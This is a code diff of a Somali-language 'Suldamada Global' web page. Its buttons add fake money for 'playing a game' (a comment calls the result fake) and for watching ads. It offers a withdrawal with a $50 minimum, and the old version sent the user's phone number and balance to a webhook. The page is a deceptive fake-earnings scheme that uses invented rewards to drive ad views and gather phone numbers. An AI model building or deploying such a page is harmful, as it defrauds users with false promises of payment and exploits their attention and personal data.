@@ -1,45 +1,34 @@
 
-<script>
-    // Qaybta Game-ka (Sida loo ciyaaro)
-    function playGame() {
-        let confirmPlay = confirm("Ma rabtaa inaad ciyaarto Game-ka si aad u kasbato $2.00?");
-        if (confirmPlay) {
-            alert("Game-ku wuu socdaa... Fadlan sug...");
-            // Waxaan samaynaynaa fake game result
-            setTimeout(() => {
-                let balEl = document.getElementById('balance');
-                let newBal = parseFloat(balEl.innerText) + 2.00;
-                balEl.innerText = newBal.toFixed(2);
-                alert("Hambalyo! Waxaad ku guulaysatay $2.00.");
-            }, 3000);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Suldamada Global</title>
+    <style>
+        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; padding: 20px; }
+        .app-container { width: 100%; max-width: 400px; background: #1e293b; padding: 25px; border-radius: 30px; text-align: center; }
+        .btn { width: 100%; padding: 15px; margin: 10px 0; border-radius: 50px; border: none; cursor: pointer; color: white; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <h1>$<span id="balance">32.75</span></h1>
+        <button class="btn" style="background:#2563eb" onclick="addBal(2)">Play Game +$2</button>
+        <button class="btn" style="background:#6366f1" onclick="addBal(5.5)">Watch Ad +$5.5</button>
+        <input type="text" id="phone" placeholder="Geli lambarka">
+        <button class="btn" style="background:#10b981" onclick="withdraw()">Withdraw</button>
+    </div>
+    <script>
+        function addBal(amt) {
+            let b = document.getElementById('balance');
+            b.innerText = (parseFloat(b.innerText) + amt).toFixed(2);
         }
-    }
-
-    // Qaybta Xayaysiiska (Monetag Direct Link)
-    function watchAd() {
-        window.open("https://omg10.com/4/11075110", "_blank");
-        setTimeout(() => {
-            let balEl = document.getElementById('balance');
-            let newBal = parseFloat(balEl.innerText) + 5.50;
-            balEl.innerText = newBal.toFixed(2);
-            alert("Waad daawatay xayaysiiska! $5.50 ayaa laguugu daray.");
-        }, 15000); // 15 ilbiriqsi
-    }
-
-    // Qaybta Withdraw
-    async function sendWithdraw(method) {
-        let b = document.getElementById('balance').innerText;
-        let p = document.getElementById('phone').value;
-        if (parseFloat(b) < 50) { alert("Waan ka xunnahay! Lacagta ugu yar waa $50."); return; }
-        if (p.length < 5) { alert("Fadlan geli lambar sax ah."); return; }
-        
-        // Make.com Webhook
-        const url = "https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41";
-        await fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ "Habka": method, "Lambarka": p, "Haraaga": b })
-        });
-        alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
-    }
-</script>
+        async function withdraw() {
+            let b = document.getElementById('balance').innerText;
+            let p = document.getElementById('phone').value;
+            if(parseFloat(b) < 50) { alert("Ugu yaraan $50"); return; }
+            alert("Codsigaaga $"+b+" lambarka "+p+" waa la diray.");
+        }
+    </script>
+</body>
+</html>
